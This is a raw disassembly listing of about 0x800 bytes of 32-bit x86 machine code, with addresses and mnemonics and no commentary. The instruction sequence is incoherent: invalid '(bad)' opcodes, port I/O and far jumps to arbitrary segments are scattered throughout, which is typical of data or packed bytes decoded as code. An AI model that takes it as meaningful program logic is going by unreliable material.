  415927:	pop    ebp
  415928:	std    
  415929:	mov    dl,BYTE PTR [ecx-0x5d]
  41592c:	int3   
  41592d:	hlt    
  41592e:	push   es
  41592f:	popa   
  415930:	xor    al,0x89
  415932:	mov    edx,0xf50c7af
  415937:	lahf   
  415938:	aaa    
  415939:	std    
  41593a:	mov    BYTE PTR [ebx+0x1c753ff7],al
  415940:	enter  0xec0c,0x5e
  415944:	lea    eax,[ebx-0x78f9f8cb]
  41594a:	rcl    BYTE PTR [edi-0x28b5fe64],1
  415950:	(bad)
  415954:	(bad)  
  415956:	div    BYTE PTR [edx+eax*1+0x74]
  41595d:	add    BYTE PTR [eax],al
  41595f:	rcr    DWORD PTR [esp+ecx*4],0x2
  415963:	mov    al,ds:0x703e8196
  415968:	iret   
  415969:	inc    ebp
  41596a:	mov    DWORD PTR [eax+0x74487e53],esi
  415970:	xchg   esp,eax
  415971:	stos   BYTE PTR es:[edi],al
  415972:	jbe    0x4159b8
  415974:	sbb    ecx,ebp
  415976:	add    eax,0x4fdaee3f
  41597b:	mov    ds:0xf2101670,eax
  415980:	mov    ss,WORD PTR [ecx+0x11]
  415983:	xor    eax,0x68c0869b
  415988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415989:	fdivr  QWORD PTR [edx-0x27]
  41598c:	call   0xf212cd1f
  415991:	mov    ss,WORD PTR [ebx]
  415993:	cmp    DWORD PTR [edx],eax
  415995:	std    
  415996:	inc    ebx
  415997:	jne    0x415974
  415999:	mov    ebx,0xdf07edff
  41599e:	test   BYTE PTR [ecx+0x790ee9f6],bh
  4159a4:	popf   
  4159a5:	jmp    0x2799:0x286267c
  4159ac:	jl     0x415940
  4159ae:	jl     0x4159e6
  4159b0:	test   BYTE PTR [ebp-0xc3b4dcf],0x3
  4159b7:	es jge 0x4159c5
  4159ba:	test   BYTE PTR [ecx+0x7039b9f2],cl
  4159c0:	psllq  mm7,QWORD PTR [eax+eax*1+0x0]
  4159c5:	add    BYTE PTR [eax],al
  4159c7:	add    BYTE PTR [esi+0x7543d9be],ah
  4159cd:	mov    DWORD PTR ds:0x5ff2e690,edx
  4159d3:	inc    esi
  4159d4:	push   ecx
  4159d5:	mov    DWORD PTR ds:0x6ff6be7c,edx
  4159db:	dec    ecx
  4159dc:	inc    ebp
  4159dd:	jge    0x415a03
  4159df:	cld    
  4159e0:	out    dx,eax
  4159e1:	int    0xde
  4159e3:	jp     0x415a32
  4159e5:	jnp    0x415a13
  4159e7:	cwde   
  4159e8:	ins    BYTE PTR es:[edi],dx
  4159e9:	shl    dh,0x82
  4159ec:	aam    0x1
  4159ee:	out    0x3,eax
  4159f0:	shl    BYTE PTR ds:0x9a091164,0xa5
  4159f7:	fisttp WORD PTR [ebx]
  4159f9:	mov    DWORD PTR [eax+0x49],esi
  4159fc:	std    
  4159fd:	jle    0x4159a6
  4159ff:	push   esi
  415a01:	jbe    0x4159ea
  415a03:	add    esi,DWORD PTR [ebp+0x7d]
  415a06:	or     al,0x94
  415a08:	lods   al,BYTE PTR ds:[esi]
  415a09:	sar    ebp,0xa
  415a0c:	dec    eax
  415a0d:	xor    eax,0x8985197e
  415a12:	add    ah,bl
  415a14:	es repz aas 
  415a17:	jmp    0xd5b51c19
  415a1c:	test   ch,0x38
  415a1f:	and    ebx,DWORD PTR [eax+eiz*1-0x77]
  415a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a24:	inc    BYTE PTR [edx]
  415a26:	leave  
  415a27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a28:	iret   
  415a29:	xchg   edi,eax
  415a2a:	je     0x415a3e
  415a2c:	add    BYTE PTR [eax],al
  415a2e:	add    BYTE PTR [eax],al
  415a30:	add    BYTE PTR [esi],bl
  415a32:	xor    eax,0x84b272fc
  415a37:	sar    BYTE PTR [ebp-0x29bb8286],cl
  415a3d:	jno    0x415a0a
  415a3f:	inc    edx
  415a40:	and    DWORD PTR [ebx-0x3],ebp
  415a43:	dec    esi
  415a44:	ins    BYTE PTR es:[edi],dx
  415a45:	jge    0x415a37
  415a47:	mov    BYTE PTR [edi],ah
  415a49:	adc    DWORD PTR [edi-0x668917c2],edi
  415a4f:	or     al,0x7a
  415a51:	pop    esp
  415a52:	cs dec edi
  415a54:	jmp    0x8943:0x56e83337
  415a5b:	std    
  415a5c:	push   0x64
  415a5e:	xchg   BYTE PTR [eax],al
  415a60:	pop    edi
  415a61:	dec    edx
  415a62:	xchg   DWORD PTR [ebx-0x23],esi
  415a65:	xor    bh,bh
  415a67:	sbb    al,0x9
  415a69:	add    dl,BYTE PTR [esp+edx*1]
  415a6c:	es hlt 
  415a6e:	(bad)  
  415a6f:	sbb    al,0x19
  415a71:	add    DWORD PTR [esi+edi*1+0x7b0176e8],eax
  415a78:	mov    ch,0x8f
  415a7a:	inc    ebx
  415a7b:	or     BYTE PTR [edx],al
  415a7d:	loope  0x415a80
  415a7f:	cmc    
  415a80:	shl    BYTE PTR [ebp-0x76],cl
  415a83:	add    DWORD PTR [edx-0x15f3ec87],ebx
  415a89:	push   es
  415a8a:	mov    BYTE PTR [ebp+edx*4+0x6f],bh
  415a8e:	sub    esi,esp
  415a90:	add    BYTE PTR [edi+0x820b55],dh
  415a96:	add    BYTE PTR [eax],al
  415a98:	add    BYTE PTR [eax],al
  415a9a:	jnp    0x415b13
  415a9c:	sti    
  415a9d:	jmp    FWORD PTR [ebx+0xb]
  415aa0:	inc    ecx
  415aa1:	or     al,0x7a
  415aa3:	fcmovnb st,st(4)
  415aa5:	ret    0x3bc
  415aa8:	push   ecx
  415aa9:	mov    ebp,DWORD PTR [eax]
  415aab:	into   
  415aac:	dec    esi
  415aad:	push   esi
  415aae:	pop    ss
  415aaf:	stos   BYTE PTR es:[edi],al
  415ab0:	rcl    DWORD PTR [edx],0xdc
  415ab3:	add    edx,DWORD PTR [ebx-0x1]
  415ab6:	loope  0x415a3f
  415ab8:	cld    
  415ab9:	(bad)  
  415aba:	pop    ebx
  415abb:	jmp    0x85d6:0x78448b07
  415ac2:	pop    ebx
  415ac3:	cmc    
  415ac4:	bound  eax,QWORD PTR [ebp+0x6a5ef54c]
  415aca:	fwait
  415acb:	js     0x415b3e
  415acd:	or     BYTE PTR [ebx+0x1c13698a],cl
  415ad3:	add    eax,DWORD PTR [ecx+0x3fcfe0c0]
  415ad9:	push   eax
  415ada:	in     eax,0x3a
  415adc:	or     bh,bh
  415ade:	jb     0x415ae6
  415ae0:	inc    ecx
  415ae1:	cld    
  415ae2:	test   eax,0xd102383f
  415ae7:	mov    esi,0x21244274
  415aec:	cmp    DWORD PTR [ecx],eax
  415aee:	sbb    al,0xa
  415af0:	fadd   DWORD PTR [ebp+0x5732e9e7]
  415af6:	cmp    ebp,edi
  415af8:	or     edx,DWORD PTR [ebx+0x44]
  415afb:	add    al,0x3e
  415afd:	add    DWORD PTR [eax],eax
  415aff:	add    BYTE PTR [eax],al
  415b01:	add    BYTE PTR [eax],al
  415b03:	sbb    al,0xe9
  415b05:	cmp    bh,bh
  415b07:	inc    ecx
  415b08:	add    bh,bl
  415b0a:	adc    eax,0x3d9168
  415b0f:	fucomi st,st(6)
  415b11:	pop    es
  415b12:	test   DWORD PTR [ebp+0x59],esi
  415b15:	sti    
  415b16:	xchg   edx,eax
  415b17:	mov    ch,0x76
  415b19:	mov    esp,0xe7c24
  415b1e:	cmp    DWORD PTR [ecx-0x41],esi
  415b21:	jns    0x415b22
  415b23:	call   ebp
  415b25:	(bad)  
  415b26:	mov    eax,DWORD PTR [edx+ebx*4-0x67]
  415b2a:	aaa    
  415b2b:	cwde   
  415b2c:	call   0xfcfa:0x33b68901
  415b33:	sub    BYTE PTR [ebp+0x219dc578],bl
  415b39:	in     eax,0xfe
  415b3b:	mov    ds:0xac592b5f,al
  415b40:	(bad)  
  415b42:	jmp    FWORD PTR [ecx]
  415b44:	and    al,0xa0
  415b46:	jg     0x415ae1
  415b48:	test   al,0x2
  415b4a:	add    BYTE PTR [ebp+0x4c],dh
  415b4d:	xor    edx,DWORD PTR [ebp+0xf]
  415b50:	lahf   
  415b51:	js     0x415b43
  415b53:	int    0xd5
  415b55:	inc    esp
  415b56:	stc    
  415b57:	jne    0x415b0b
  415b59:	inc    esi
  415b5a:	or     BYTE PTR [edx+0x15],dh
  415b5d:	jns    0x415b5f
  415b5f:	jne    0x415afc
  415b61:	xor    DWORD PTR [eax-0x13],ebp
  415b64:	add    eax,0x41
  415b69:	add    BYTE PTR [eax],al
  415b6b:	add    dh,bh
  415b6d:	in     eax,0x9b
  415b6f:	sbb    ecx,DWORD PTR [esi+0x3583019a]
  415b75:	das    
  415b76:	or     al,0x8b
  415b78:	mov    ebx,0xf5087795
  415b7d:	mov    dl,0xe1
  415b7f:	jae    0x415bf0
  415b81:	sbb    ecx,DWORD PTR [edx-0x7e6c66f9]
  415b87:	test   DWORD PTR [eax+0x1e3ffecc],0x76efd848
  415b91:	add    bl,BYTE PTR [esp+edi*8]
  415b94:	out    dx,eax
  415b95:	daa    
  415b96:	out    dx,eax
  415b97:	xor    eax,0x935c7745
  415b9c:	jmp    0x415b23
  415b9e:	mov    es,esp
  415ba0:	not    BYTE PTR [edx+0x1d88c85]
  415ba6:	out    0x3,eax
  415ba8:	jne    0x415b44
  415baa:	or     bh,BYTE PTR [esi-0x549d7a38]
  415bb0:	imul   BYTE PTR [ecx-0x37b33025]
  415bb6:	mov    ecx,0xfa16868c
  415bbb:	inc    ebx
  415bbc:	jne    0x415c37
  415bbe:	dec    edi
  415bbf:	xchg   BYTE PTR [eax-0x24cef1f2],ah
  415bc5:	fwait
  415bc6:	cmp    al,0x3
  415bc8:	jne    0x415ba3
  415bca:	sub    DWORD PTR ds:0x309ee9d,esi
  415bd0:	add    BYTE PTR [eax],al
  415bd2:	add    BYTE PTR [eax],al
  415bd4:	add    BYTE PTR [ebp+0x79],dh
  415bd7:	mov    ah,0xff
  415bd9:	xor    DWORD PTR ds:0x81cb0270,ebp
  415bdf:	pop    ds
  415be0:	mov    WORD PTR [ebp-0x2],ds
  415be3:	leave  
  415be4:	add    dh,BYTE PTR [ebp+0x79]
  415be7:	mov    ah,0xf3
  415be9:	repz add ah,BYTE PTR ds:0x9a034c46
  415bf0:	fwait
  415bf1:	sub    al,dh
  415bf3:	out    0x3,eax
  415bf5:	out    dx,eax
  415bf6:	ds loop 0x415c24
  415bf9:	fwait
  415bfa:	sub    DWORD PTR [eax+0x620281c6],esi
  415c00:	inc    ebp
  415c01:	rol    DWORD PTR [ecx],0x23
  415c04:	loopne 0x415c80
  415c06:	(bad)  
  415c07:	out    0x3,al
  415c09:	aad    0x1
  415c0b:	ss jmp 0x3d41e1ba
  415c11:	adc    eax,0x49308af9
  415c16:	xchg   DWORD PTR [ebp+ecx*8+0x2],esi
  415c1a:	xchg   BYTE PTR [ebp-0x1b],dh
  415c1d:	push   cs
  415c1e:	mov    ds,edi
  415c20:	xchg   esi,eax
  415c21:	(bad)  
  415c22:	sub    DWORD PTR es:[ecx-0x1750017b],0xfffffffb
  415c2a:	push   DWORD PTR [ecx]
  415c2c:	test   eax,0x2fff9bb
  415c31:	jo     0x415bb6
  415c33:	mov    edi,0x61b4ded9
  415c38:	jmp    0x415c3d
  415c3d:	add    BYTE PTR [esi+0x52],dh
  415c40:	jmp    FWORD PTR [ecx]
  415c42:	addr16 jnp 0x415c34
  415c45:	push   esi
  415c46:	xchg   DWORD PTR [edx],esi
  415c48:	call   0xfdc509ab
  415c4d:	aas    
  415c4e:	xor    eax,0xb7e807de
  415c53:	sti    
  415c54:	fbld   TBYTE PTR [ebx+0x31]
  415c57:	add    dh,BYTE PTR [edi+eiz*8+0x44]
  415c5b:	call   0x2789:0x271e57c
  415c62:	lahf   
  415c63:	rol    BYTE PTR [ecx+ebp*8],0xa5
  415c67:	jns    0x415c55
  415c69:	push   0x15
  415c6b:	mov    edi,DWORD PTR [edi+0x15]
  415c6e:	pop    ebp
  415c6f:	sti    
  415c70:	(bad)  
  415c71:	call   0x29728901
  415c76:	xchg   BYTE PTR [edx-0x75],al
  415c79:	ins    DWORD PTR es:[edi],dx
  415c7a:	and    dl,ah
  415c7c:	mov    al,al
  415c7e:	fisub  WORD PTR [eax+edi*8-0x17]
  415c82:	jbe    0x415c55
  415c84:	mov    edi,0x2fde6aae
  415c89:	add    DWORD PTR [edx+eax*2+0x3a50000],0x1c8024
  415c94:	add    BYTE PTR [ecx+0x81a398],cl
  415c9a:	or     al,0x0
  415c9c:	test   DWORD PTR [eax+ebp*1+0x8],eax
  415ca3:	add    BYTE PTR [eax],al
  415ca5:	add    BYTE PTR [eax],al
  415ca7:	fadd   st(0),st
  415ca9:	test   BYTE PTR [eax+edx*2],ah
  415cac:	(bad)  
  415cad:	(bad)  
  415cae:	dec    esp
  415cb0:	(bad)  
  415cb1:	(bad)  
  415cb2:	jmp    DWORD PTR [edi-0x3c]
  415cb5:	jnp    0x8b86798
  415cbb:	imul   ecx,DWORD PTR [ecx],0x54
  415cbe:	and    al,0xb0
  415cc0:	int    0x86
  415cc2:	push   ebx
  415cc3:	enter  0x523d,0xc6
  415cc7:	fsub   DWORD PTR [ebx-0x30bcffe8]
  415ccd:	add    eax,DWORD PTR [esp+ecx*2-0x71827e78]
  415cd4:	(bad)  
  415cd5:	dec    DWORD PTR [eax+ebx*8-0x49afe65d]
  415cdc:	jmp    FWORD PTR [ecx+0x1]
  415cdf:	push   ebx
  415ce0:	repz and esp,DWORD PTR [esp+eiz*2]
  415ce4:	jecxz  0x415d4f
  415ce6:	add    BYTE PTR [esi+eax*1+0x44],bl
  415cea:	and    al,0x6c
  415cec:	add    al,0x44
  415cee:	and    al,0x64
  415cf0:	add    al,0x8
  415cf2:	mov    esp,DWORD PTR ds:0x604b869b
  415cf8:	js     0x415d2a
  415cfa:	mov    ecx,DWORD PTR [eax+ebp*2-0x23]
  415cfe:	cmp    ecx,DWORD PTR [ebp-0x1]
  415d01:	push   ebp
  415d02:	call   0x40123e
  415d07:	lahf   
  415d08:	cli    
  415d09:	and    edx,DWORD PTR [eax]
  415d0b:	add    BYTE PTR [eax],al
  415d0d:	add    BYTE PTR [eax],al
  415d0f:	add    BYTE PTR [ebp-0x67],dh
  415d12:	clc    
  415d13:	xor    DWORD PTR [edi+edx*4-0x40affff],0x3
  415d1b:	mov    edx,DWORD PTR [ecx-0x2f482003]
  415d21:	cwde   
  415d22:	add    DWORD PTR [eax],eax
  415d24:	mov    BYTE PTR [edx+0x5a21e841],bl
  415d2a:	add    al,0x0
  415d2c:	add    BYTE PTR ds:0x9975bfe0,ah
  415d32:	add    DWORD PTR [eax+0x19919],edi
  415d38:	int    0x57
  415d3a:	rol    DWORD PTR [eax],0x75
  415d3d:	push   ss
  415d3e:	push   eax
  415d3f:	and    al,0x9f
  415d41:	call   0xfd9b:0x40cd0001
  415d48:	mov    edx,0x7c141b
  415d4d:	pop    ebp
  415d4e:	frstor [edi]
  415d50:	stos   BYTE PTR es:[edi],al
  415d51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d52:	fst    QWORD PTR [ebx]
  415d54:	inc    ebp
  415d55:	and    BYTE PTR [edi-0x22ab17b0],bh
  415d5b:	das    
  415d5c:	and    eax,0x5d244016
  415d61:	imul   ebx,DWORD PTR [ecx+0x19a7b16],0x7d00b181
  415d6b:	rol    BYTE PTR [edx+0x5bb7c5f6],0x6b
  415d72:	add    DWORD PTR [eax],eax
  415d74:	add    BYTE PTR [eax],al
  415d76:	add    BYTE PTR [eax],al
  415d78:	add    dh,ch
  415d7a:	sub    edx,eax
  415d7c:	add    BYTE PTR [ebp-0x55],dh
  415d7f:	cmp    dh,BYTE PTR [ebx+0x4c]
  415d82:	cmc    
  415d83:	or     al,0x8
  415d85:	icebp  
  415d86:	sbb    eax,0xf742440d
  415d8b:	lock mov BYTE PTR [ecx+0x5de00b02],dh
  415d92:	mov    BYTE PTR [edx],0xec
  415d95:	sub    eax,edi
  415d97:	loop   0x415e15
  415d99:	leave  
  415d9a:	es jmp 0x415e19
  415d9d:	sub    ebp,DWORD PTR [ebx-0x54]
  415da0:	fwait
  415da1:	jne    0x415da5
  415da3:	arpl   bx,ax
  415da5:	and    DWORD PTR [eax],0x8d650eb6
  415dab:	and    esp,eax
  415dad:	sbb    WORD PTR [eax+edi*8],0xd6fd
  415db3:	ret    0xfddf
  415db6:	push   eax
  415db7:	jg     0x415e10
  415db9:	int    0x2
  415dbb:	out    0x7f,eax
  415dbd:	mov    ch,0xf6
  415dbf:	jmp    0x415d82
  415dc1:	cmp    DWORD PTR [esi],esp
  415dc3:	out    dx,al
  415dc4:	add    cl,al
  415dc6:	test   dl,0xef
  415dc9:	fisub  DWORD PTR [edx]
  415dcb:	mov    dl,0x2
  415dcd:	jne    0x415d50
  415dcf:	fcmovnu st,st(7)
  415dd1:	mov    gs,WORD PTR [edx-0xa]
  415dd4:	int3   
  415dd5:	stos   DWORD PTR es:[edi],eax
  415dd6:	and    DWORD PTR [edi+0x7],0xf8e71159
  415ddd:	add    BYTE PTR [eax],al
  415ddf:	add    BYTE PTR [eax],al
  415de1:	add    dh,dh
  415de3:	jmp    edi
  415de5:	add    esi,DWORD PTR [ebp+0x6b]
  415de8:	xchg   BYTE PTR [ebx],al
  415dea:	jne    0x415dee
  415dec:	cmp    eax,0xe796597f
  415df1:	add    esi,DWORD PTR [ebp+0x3]
  415df4:	fwait
  415df5:	stc    
  415df6:	cmc    
  415df7:	mov    ebp,0x2756bc3
  415dfc:	out    0x3,eax
  415dfe:	jo     0x415d87
  415e00:	xchg   DWORD PTR [edx],eax
  415e02:	jne    0x415e06
  415e04:	std    
  415e05:	jle    0x415da0
  415e07:	xchg   esi,eax
  415e08:	out    0x3,eax
  415e0a:	jne    0x415e2e
  415e0c:	add    BYTE PTR [ebp+0x3c],bh
  415e0f:	cmp    BYTE PTR [ebp+eax*8-0x16fffd5e],0x76
  415e17:	jae    0x43ce4e
  415e1d:	xchg   esi,eax
  415e1e:	jns    0x415e2a
  415e20:	add    cl,ch
  415e22:	inc    esi
  415e24:	cld    
  415e25:	cmp    eax,0x658b1115
  415e2a:	adc    eax,0x76e9011d
  415e2f:	ror    BYTE PTR [edx+0x4fe91525],cl
  415e35:	je     0x415e6c
  415e37:	es dec esp
  415e39:	xchg   ecx,eax
  415e3a:	xor    al,dl
  415e3c:	(bad)  
  415e3d:	call   0xf96522f1
  415e42:	jecxz  0x415dc7
  415e44:	sbb    ebp,eax
  415e46:	add    BYTE PTR [eax],al
  415e48:	add    BYTE PTR [eax],al
  415e4a:	add    BYTE PTR [esi+0x2],dh
  415e4d:	mov    ah,BYTE PTR ds:0xf623d5d5
  415e53:	jb     0x415e5f
  415e55:	cmp    al,0xd2
  415e57:	ret    
  415e58:	or     DWORD PTR [ebx],0xffffffe8
  415e5b:	jbe    0x415e5f
  415e5d:	cmp    al,0x2
  415e5f:	mov    ds:0x76e9d884,al
  415e64:	add    al,BYTE PTR [ecx+0x10bacd]
  415e6a:	not    BYTE PTR [edx]
  415e6c:	jl     0x415e6e
  415e6e:	jmp    0x9e47e9e9
  415e73:	std    
  415e74:	lea    esp,[ecx*8-0x47fffd89]
  415e7b:	out    dx,eax
  415e7c:	push   eax
  415e7d:	std    
  415e7e:	mov    ecx,0xcd44896a
  415e83:	test   ax,ax
  415e86:	nop
  415e87:	sar    DWORD PTR [ebp+0x13],1
  415e8a:	add    BYTE PTR [eax+0x9003d71],cl
  415e90:	push   ebp
  415e91:	and    al,0x0
  415e93:	dec    esp
  415e94:	jns    0x415e18
  415e96:	ror    DWORD PTR [esp+eax*1+0x0],1
  415e9a:	call   ecx
  415e9c:	jp     0x415e28
  415e9e:	test   BYTE PTR [eax-0x12],dh
  415ea1:	(bad)  
  415ea2:	dec    DWORD PTR [esp+esi*1]
  415ea5:	xchg   DWORD PTR [ebp+0x1c],eax
  415ea8:	sbb    bl,BYTE PTR ds:0x9ea4e8
  415eae:	add    BYTE PTR [eax],al
  415eb0:	add    BYTE PTR [eax],al
  415eb2:	add    BYTE PTR [eax],al
  415eb4:	xchg   ecx,eax
  415eb5:	inc    ebx
  415eb6:	or     eax,DWORD PTR [eax+ecx*1-0x477]
  415ebd:	inc    ebx
  415ebe:	inc    eax
  415ebf:	test   DWORD PTR [ecx+edi*2],ebx
  415ec2:	sub    BYTE PTR [ecx-0x74fffc24],0x48
  415ec9:	pop    edi
  415eca:	jge    0x415ecc
  415ecc:	int3   
  415ecd:	add    eax,DWORD PTR [edi-0x3f7c]
  415ed3:	(bad)  
  415ed4:	fcom   QWORD PTR [esi+eax*8+0x6a]
  415ed8:	int    0xfe
  415eda:	mov    esp,DWORD PTR [eax+edx*2]
  415edd:	add    eax,DWORD PTR [eax]
  415edf:	add    BYTE PTR ds:0x9c8823f7,ah
  415ee5:	add    eax,DWORD PTR [eax]
  415ee7:	mov    DWORD PTR [eax],ebx
  415ee9:	pop    edi
  415eea:	mov    DWORD PTR [eax],eax
  415eec:	mov    WORD PTR [ebx],es
  415eee:	dec    ebp
  415eef:	mov    ecx,DWORD PTR [ebx-0x65]
  415ef2:	stos   BYTE PTR es:[edi],al
  415ef3:	push   0xffffff9c
  415ef5:	add    eax,DWORD PTR [edi+0x748d11f0]
  415efb:	outs   dx,BYTE PTR ds:[esi]
  415efc:	pop    ss
  415efd:	jge    0x415e87
  415eff:	dec    ebx
  415f00:	push   0x11c454c
  415f05:	sbb    DWORD PTR [edi+0x7a79754b],eax
  415f0b:	inc    eax
  415f0d:	adc    BYTE PTR [ecx],dh
  415f0f:	or     BYTE PTR [edx-0x41],dl
  415f12:	jns    0x415f58
  415f14:	xchg   ecx,eax
  415f15:	pop    esp
  415f16:	cdq    
  415f17:	jecxz  0x415f19
  415f19:	add    BYTE PTR [eax],al
  415f1b:	add    BYTE PTR [eax],al
  415f1d:	jl     0x415f89
  415f1f:	add    DWORD PTR [esi+0x4d],edx
  415f22:	adc    ah,cl
  415f24:	(bad)  
  415f25:	xor    ch,cl
  415f27:	pop    es
  415f28:	and    al,0x7a
  415f2a:	imul   ecx,DWORD PTR ds:0x2c2247,0x1619e80
  415f34:	jae    0x415eeb
  415f36:	idiv   BYTE PTR [edi]
  415f38:	and    al,0xb5
  415f3a:	push   ecx
  415f3b:	ja     0x415f9d
  415f3d:	jne    0x415fa8
  415f3f:	jle    0x415f01
  415f41:	push   0xffffffe0
  415f43:	jb     0x415f40
  415f45:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f47:	xchg   edi,eax
  415f48:	sub    ebx,DWORD PTR [edi+0x69]
  415f4b:	jbe    0x415f99
  415f4d:	cdq    
  415f4e:	sub    eax,0x6955e39c
  415f53:	add    DWORD PTR [esi-0x2],esp
  415f56:	xor    al,0xe0
  415f58:	push   ebx
  415f59:	or     eax,0x750004b1
  415f5e:	pmovmskb eax,mm7
  415f61:	push   0x38
  415f63:	shl    ebp,0xcd
  415f66:	add    eax,esp
  415f68:	adc    DWORD PTR [ebp-0x5dac6596],0x8d5582d7
  415f72:	(bad)  
  415f74:	(bad)  
  415f75:	xchg   edx,eax
  415f76:	jmp    0x415f7e
  415f78:	add    al,0x75
  415f7a:	inc    eax
  415f7b:	push   eax
  415f7c:	and    al,0xf5
  415f7e:	push   0x1
  415f83:	add    BYTE PTR [eax],al
  415f85:	add    BYTE PTR [edx-0x28],ch
  415f88:	mov    esi,0xe002f1e8
  415f8d:	add    dh,BYTE PTR [ebp-0x23]
  415f90:	mov    esp,0x61da3479
  415f95:	lahf   
  415f96:	mov    esi,0x4b03db40
  415f9b:	(bad)  
  415f9c:	retf   0x4bff
  415f9f:	fdiv   DWORD PTR [ecx-0x6d]
  415fa2:	cmp    BYTE PTR ds:0x2b50db7,al
  415fa8:	jae    0x415fa7
  415faa:	enter  0x426a,0xcb
  415fae:	sub    edi,DWORD PTR [esi+0x72]
  415fb1:	mov    ebp,0x3eb40c3
  415fb6:	sbb    bh,dh
  415fb8:	add    bh,al
  415fba:	cmc    
  415fbb:	in     al,0xea
  415fbd:	add    ecx,DWORD PTR [eax]
  415fbf:	test   DWORD PTR [edx],0xdec538f8
  415fc5:	add    ah,BYTE PTR [ebx-0x7d1fcc83]
  415fcb:	push   0xffffffc8
  415fcd:	mov    al,ds:0xc3637de8
  415fd2:	imul   ecx,DWORD PTR [ebx],0xc49cc3da
  415fd8:	loop   0x415fc2
  415fda:	adc    dh,BYTE PTR [esi-0x61]
  415fdd:	sar    DWORD PTR [ecx+0x2],0x14
  415fe1:	jns    0x415fb4
  415fe3:	rcr    DWORD PTR [ecx],cl
  415fe5:	cs and dl,ch
  415fe8:	mov    edx,0xff
  415fed:	add    BYTE PTR [eax],al
  415fef:	mov    dl,0x7d
  415ff1:	sar    ebx,1
  415ff3:	test   eax,0x34ad3f37
  415ff8:	add    bl,BYTE PTR [edx]
  415ffa:	test   eax,0x844adff2
  415fff:	data16 fadd DWORD PTR es:[ebx+0x75]
  416004:	mov    DWORD PTR [edi],esi
  416006:	enter  0xd85,0x0
  41600a:	ins    DWORD PTR es:[edi],dx
  41600b:	mov    ebx,0xede90002
  416010:	cmp    DWORD PTR [ecx+edi*8-0x48aefd4a],edi
  416017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416018:	call   0xf1331a1b
  41601d:	sbb    esp,DWORD PTR [esi]
  41601f:	push   eax
  416020:	and    eax,0x7f76e900
  416025:	jae    0x416018
  416027:	stc    
  416028:	push   esi
  416029:	sub    DWORD PTR [ecx],0x41
  41602c:	sbb    DWORD PTR [ebx+0x510276e9],0xfeeb423f
  416036:	cmp    esi,esi
  416038:	lock sbb edx,esi
  41603b:	sbb    al,0x5
  41603d:	std    
  41603e:	mov    dh,0xfc
  416040:	inc    ecx
  416041:	or     eax,0x1fe6d
  416046:	jmp    0xb65d5142
  41604b:	pop    esp
  41604c:	pop    esi
  41604d:	adc    BYTE PTR [ecx],ch
  41604f:	jns    0x4160d0
  416051:	jbe    0x416044
  416053:	add    BYTE PTR [eax],al
  416055:	add    BYTE PTR [eax],al
  416057:	add    bl,bh
  416059:	cmp    BYTE PTR [edi+esi*8-0x4a],ch
  41605d:	jl     0x415fe7
  41605f:	xor    al,0x95
  416061:	jg     0x416038
  416063:	xor    BYTE PTR [edx],al
  416065:	dec    edx
  416066:	or     eax,0xf50ebf3e
  41606b:	mov    al,ds:0xe14e83b1
  416070:	ret    0x810e
  416073:	cmp    DWORD PTR [edx-0xa],0x16196a06
  41607a:	jae    0x416074
  41607c:	nop
  41607d:	sbb    al,0xe9
  41607f:	loope  0x41606a
  416081:	fistp  DWORD PTR [edi]
  416083:	ret    
  416084:	jle    0x41600b
  416086:	pop    esi
  416087:	add    BYTE PTR [eax+0x5e],bh
  41608a:	arpl   WORD PTR [ecx-0x48f4ed26],cx
  416090:	retf   0xb12
  416093:	scas   eax,DWORD PTR es:[edi]
  416094:	sbb    al,BYTE PTR [ebx+ecx*1]
  416097:	scas   eax,DWORD PTR es:[edi]
  416098:	popf   
  416099:	popf   
  41609a:	jg     0x41607e
  41609c:	pop    ebx
  41609d:	add    eax,0x384c1c2
  4160a2:	push   eax
  4160a3:	dec    DWORD PTR [ebx+0x150c798b]
  4160a9:	pop    DWORD PTR [esi+0x14]
  4160ac:	lds    esp,FWORD PTR [eax+0xd]
  4160af:	cmp    eax,DWORD PTR [edi+0x74]
  4160b2:	dec    DWORD PTR [eax+0x187180eb]
  4160b8:	adc    edi,DWORD PTR [ebx+0x11]
  4160bb:	inc    DWORD PTR [eax]
  4160bd:	add    BYTE PTR [eax],al
  4160bf:	add    BYTE PTR [eax],al
  4160c1:	leave  
  4160c2:	push   ss
  4160c3:	dec    edi
  4160c4:	push   esi
  4160c5:	inc    ebx
  4160c6:	jnp    0x4160cd
  4160c8:	dec    DWORD PTR [ecx]
  4160ca:	mov    eax,0x8f1c4010
  4160cf:	inc    ecx
  4160d0:	cld    
  4160d1:	ja     0x416096
  4160d3:	jae    0x4160d9
  4160d5:	pop    es
  4160d6:	std    
  4160d7:	jo     0x4160ed
  4160d9:	mov    ch,dh
  4160db:	cmp    BYTE PTR [eax],bh
  4160dd:	(bad)  
  4160df:	xor    al,0x5d
  4160e1:	loopne 0x416156
  4160e3:	push   es
  4160e4:	(bad)  
  4160e5:	jns    0x416109
  4160e7:	sti    
  4160e8:	adc    eax,0x401020
  4160ed:	inc    edi
  4160ee:	dec    edx
  4160ef:	stc    
  4160f0:	pop    edi
  4160f1:	bound  ebx,QWORD PTR [ebx-0x3a]
  4160f4:	ret    0xffa4
  4160f7:	mov    BYTE PTR [esi-0x30],al
  4160fa:	dec    edi
  4160fb:	cld    
  4160fc:	adc    eax,0x40147c
  416101:	jg     0x4160c9
  416103:	test   BYTE PTR [esi],al
  416105:	jne    0x4160e9
  416107:	mov    BYTE PTR [ebx],0xfc
  41610a:	mov    ds:0x28b38909,eax
  41610f:	xlat   BYTE PTR ds:[ebx]
  416110:	push   esp
  416111:	out    dx,al
  416112:	cmp    DWORD PTR [esi],esi
  416114:	std    
  416115:	cmp    al,0x73
  416117:	test   DWORD PTR [esi],0xfd05a2fe
  41611d:	mov    eax,ds:0x791381e1
  416122:	js     0x4160e5
  416124:	inc    DWORD PTR [eax]
  416126:	add    BYTE PTR [eax],al
  416128:	add    BYTE PTR [eax],al
  41612a:	mov    bl,0x50
  41612c:	aas    
  41612d:	jb     0x416191
  41612f:	or     al,0xf7
  416131:	add    ebx,DWORD PTR [ebp+0x10]
  416134:	cmp    bh,bh
  416136:	inc    edx
  416137:	call   0x74e46d82
  41613c:	adc    eax,0x1a98714
  416141:	pop    ebp
  416142:	retf   
  416143:	test   al,0xd1
  416145:	push   eax
